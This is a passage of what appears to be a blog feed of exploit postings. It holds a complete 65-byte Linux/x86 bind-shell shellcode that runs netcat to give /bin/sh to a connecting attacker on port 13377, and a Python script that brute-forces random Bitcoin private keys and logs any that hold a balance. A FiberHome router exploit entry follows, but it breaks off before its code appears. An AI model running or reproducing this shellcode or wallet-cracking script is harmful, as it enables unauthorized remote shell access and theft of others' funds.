    <content type="html"><![CDATA[<h4 id="Linux-x86-Bindshell-Shellcode"><a href="#Linux-x86-Bindshell-Shellcode" class="headerlink" title="Linux/x86 Bindshell Shellcode"></a>Linux/x86 Bindshell Shellcode</h4><p>65 bytes small Linux/x86 bindshell shellcode that binds /bin/sh to TCP/0.0.0.0:13377.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Exploit Title: Linux/x86 - <span class="hljs-built_in">bind</span> shell on port 13377 Shellcode (65 bytes)</span><br><span class="hljs-meta">#</span><span class="bash"> Date: Jan 12, 2021</span><br><span class="hljs-meta">#</span><span class="bash"> Exploit Author: ac3</span><br><span class="hljs-meta">#</span><span class="bash"> Version: Linux x86</span><br><span class="hljs-meta">#</span><span class="bash"> Tested on: Linux x86</span><br><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># linux x86 nc -lvve/bin/sh -p13377 shellcode</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker</span></span><br><br><span class="hljs-meta">#</span><span class="bash"> 31 c0                   xor    %eax,%eax</span><br><span class="hljs-meta">#</span><span class="bash"> 31 d2                   xor    %edx,%edx</span><br><span class="hljs-meta">#</span><span class="bash"> 50                      push   eax</span><br><span class="hljs-meta">#</span><span class="bash"> 68 33 33 37 37          push   <span class="hljs-variable">$0x37373333</span></span><br><span class="hljs-meta">#</span><span class="bash"> 68 2d 76 70 31          push   <span class="hljs-variable">$0x3170762d</span></span><br><span class="hljs-meta">#</span><span class="bash"> 89 e2                   mov    %esp,%edx</span><br><span class="hljs-meta">#</span><span class="bash"> 50                      push   %eax</span><br><span class="hljs-meta">#</span><span class="bash"> 68 6e 2f 73 68          push   <span class="hljs-variable">$0x68732f6e</span></span><br><span class="hljs-meta">#</span><span class="bash"> 68 65 2f 62 69          push   <span class="hljs-variable">$0x69622f65</span></span><br><span class="hljs-meta">#</span><span class="bash"> 68 2d 6c 76 76          push   <span class="hljs-variable">$0x76766c2d</span></span><br><span class="hljs-meta">#</span><span class="bash"> 89 e1                   mov    %esp,%ecx</span><br><span class="hljs-meta">#</span><span class="bash"> 50                      push   %eax</span><br><span class="hljs-meta">#</span><span class="bash"> 68 2f 2f 6e 63          push   <span class="hljs-variable">$0x636e2f2f</span></span><br><span class="hljs-meta">#</span><span class="bash"> 68 2f 2f 2f 2f          push   <span class="hljs-variable">$0x2f2f2f2f</span></span><br><span class="hljs-meta">#</span><span class="bash"> 68 2f 62 69 6e          push   <span class="hljs-variable">$0x6e69622f</span></span><br><span class="hljs-meta">#</span><span class="bash"> 89 e3                   mov    %esp,%ebx</span><br><span class="hljs-meta">#</span><span class="bash"> 50                      push   %eax</span><br><span class="hljs-meta">#</span><span class="bash"> 52                      push   %edx</span><br><span class="hljs-meta">#</span><span class="bash"> 51                      push   %ecx</span><br><span class="hljs-meta">#</span><span class="bash"> 53                      push   %ebx</span><br><span class="hljs-meta">#</span><span class="bash"> 31 d2                   xor    %edx,%edx</span><br><span class="hljs-meta">#</span><span class="bash"> 89 e1                   mov    %esp,%ecx</span><br><span class="hljs-meta">#</span><span class="bash"> b0 0b                   mov    <span class="hljs-variable">$0xb</span>,%al</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> 80                   int    <span class="hljs-variable">$0x80</span></span><br><br>\x31\xc0\x31\xd2\x50\x68\x33\x33\x37\x37\x68\x2d\x76\x70\x31\x89\xe2\x50\x68\x6e\x2f\x73\x68\x68\x65\x2f\x62\x69\x68\x2d\x6c\x76\x76\x89\xe1\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x52\x51\x53\x31\xd2\x89\xe1\xb0\x0b\xcd\x80<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Shellcode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Shellcode</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bitcoin brute use python3</title>
    <link href="/2021/01/14/Bitcoin-brute-use-python3/"/>
    <url>/2021/01/14/Bitcoin-brute-use-python3/</url>
    
    <content type="html"><![CDATA[<h4 id="Bitcoin-brute-use-python3"><a href="#Bitcoin-brute-use-python3" class="headerlink" title="Bitcoin brute use python3"></a>Bitcoin brute use python3</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#Infomation: Script to brute bitcoin</span><br><br><span class="hljs-keyword">from</span> bit <span class="hljs-keyword">import</span> Key<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> ecdsa<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> requests.adapters <span class="hljs-keyword">import</span> HTTPAdapter<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pau</span>:</span><br>    pau = <span class="hljs-number">0</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prikey</span>():</span><br>    <span class="hljs-keyword">return</span> binascii.hexlify(os.urandom(<span class="hljs-number">32</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pubkey</span>(<span class="hljs-params">prikey</span>):</span><br>    prikey = binascii.unhexlify(prikey)<br>    sign = ecdsa.SigningKey.from_string(prikey, curve=ecdsa.SECP256k1)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;04&#x27;</span> + binascii.hexlify(<br>        sign.verifying_key.to_string()).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">address</span>(<span class="hljs-params">pubkey</span>):</span><br>    alphabet = <span class="hljs-string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span><br>    ares = <span class="hljs-string">&#x27;0&#x27;</span><br>    byte = <span class="hljs-string">&#x27;00&#x27;</span><br>    zero = <span class="hljs-number">0</span><br>    val = hashlib.new(<span class="hljs-string">&#x27;ripemd160&#x27;</span>)<br>    val.update(hashlib.sha256(binascii.unhexlify(pubkey.encode())).digest())<br>    cim = (byte + val.hexdigest())<br>    doublehash = hashlib.sha256(<br>        hashlib.sha256(binascii.unhexlify(cim.encode())).digest()).hexdigest()<br>    address = cim + doublehash[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> address:<br>        <span class="hljs-keyword">if</span> (char != ares):<br>            <span class="hljs-keyword">break</span><br>        zero += <span class="hljs-number">1</span><br>    zero = zero // <span class="hljs-number">2</span><br>    nom = <span class="hljs-built_in">int</span>(address, <span class="hljs-number">16</span>)<br>    result = []<br>    <span class="hljs-keyword">while</span> (nom &gt; <span class="hljs-number">0</span>):<br>        nom, reder = <span class="hljs-built_in">divmod</span>(nom, <span class="hljs-number">58</span>)<br>        result.append(alphabet[reder])<br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> (count &lt; zero):<br>        result.append(alphabet[<span class="hljs-number">0</span>])<br>        count += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(result[::-<span class="hljs-number">1</span>])<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">balance</span>(<span class="hljs-params">address</span>):</span><br>    s=requests.Session()<br>    s.mount(<span class="hljs-string">&#x27;https://&#x27;</span>, HTTPAdapter(max_retries=<span class="hljs-number">30</span>))<br>    APIGet = s.get(<br>        <span class="hljs-string">&quot;https://chain.api.btc.com/v3/address/&quot;</span> + <span class="hljs-built_in">str</span>(address), timeout=(<span class="hljs-number">27</span>))<br>    <span class="hljs-keyword">if</span> (APIGet.status_code == <span class="hljs-number">429</span>):<br>        pau.pau += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> (pau.pau &gt;= <span class="hljs-number">10</span>):<br>            print(<span class="hljs-string">&quot;\nUnable to connect to API\nRetrying in 10 seconds\n&quot;</span>)<br>            time.sleep(<span class="hljs-number">30</span>)<br>            pau.pau = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> (APIGet.status_code != <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> APIGet.status_code != <span class="hljs-number">404</span><br>            <span class="hljs-keyword">and</span> APIGet.status != <span class="hljs-number">429</span>):<br>        print(<span class="hljs-string">&quot;\nHTTP Error Code: &quot;</span> + <span class="hljs-built_in">str</span>(APIGet.status_code) +<br>              <span class="hljs-string">&quot;\nRetrying in 10 seconds\n&quot;</span>)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>    data = APIGet.json()<br>    balance = <span class="hljs-built_in">int</span>(data[<span class="hljs-string">&quot;data&quot;</span>][<span class="hljs-string">&quot;balance&quot;</span>])<br>    pau.pau = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> balance<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    data = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>    count = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        data[<span class="hljs-number">0</span>] = prikey()<br>        data[<span class="hljs-number">1</span>] = pubkey(data[<span class="hljs-number">0</span>])<br>        data[<span class="hljs-number">2</span>] = address(data[<span class="hljs-number">1</span>])<br>        data[<span class="hljs-number">3</span>] = balance(data[<span class="hljs-number">2</span>])<br>        datas = (<br>            <span class="hljs-string">&quot;\nAddress: &quot;</span> + <span class="hljs-built_in">str</span>(data[<span class="hljs-number">2</span>]) + <span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;Private Key: &quot;</span> +<br>            <span class="hljs-built_in">str</span>(data[<span class="hljs-number">0</span>]) + <span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;Wallet Import Format Private Key: &quot;</span> +<br>            <span class="hljs-built_in">str</span>(Key.from_hex(data[<span class="hljs-number">0</span>]).to_wif()) + <span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;Public Key: &quot;</span> + <span class="hljs-built_in">str</span>(<br>                data[<span class="hljs-number">1</span>]).upper() + <span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;Balance: &quot;</span> + <span class="hljs-built_in">str</span>(data[<span class="hljs-number">3</span>]) + <span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> (data[<span class="hljs-number">3</span>] == -<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (data[<span class="hljs-number">3</span>] == <span class="hljs-number">0</span>):<br>            print(<span class="hljs-string">&quot;&#123;:34&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(data[<span class="hljs-number">2</span>])) + <span class="hljs-string">&quot; [Cracked] : &quot;</span> + <span class="hljs-built_in">str</span>(data[<span class="hljs-number">3</span>]) + <span class="hljs-string">&quot; BTC &quot;</span> + <span class="hljs-built_in">str</span>(count) +<span class="hljs-string">&quot; Cracked&quot;</span>)<br>        <span class="hljs-keyword">if</span> (data[<span class="hljs-number">3</span>] &gt; <span class="hljs-number">0</span>):<br>            print(datas)<br>            fl = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;bitforce-found.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>            fl.write(datas)<br>            fl.close()<br>        count+=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    print(<span class="hljs-string">&quot;\n#Brute Test Start.#&quot;</span>)<br>    main()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Bitcoin</tag>
      
      <tag>Brute</tag>
      
      <tag>Script</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FiberHome HG6245D Disclosure / Bypass / Privilege Escalation / DoS</title>
    <link href="/2021/01/14/FiberHome-HG6245D-Disclosure-Bypass-Privilege-Escalation-DoS/"/>
    <url>/2021/01/14/FiberHome-HG6245D-Disclosure-Bypass-Privilege-Escalation-DoS/</url>
    
    <content type="html"><![CDATA[<h4 id="FiberHome-HG6245D-Disclosure-Bypass-Privilege-Escalation-DoS"><a href="#FiberHome-HG6245D-Disclosure-Bypass-Privilege-Escalation-DoS" class="headerlink" title="FiberHome HG6245D Disclosure / Bypass / Privilege Escalation / DoS"></a>FiberHome HG6245D Disclosure / Bypass / Privilege Escalation / DoS</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span 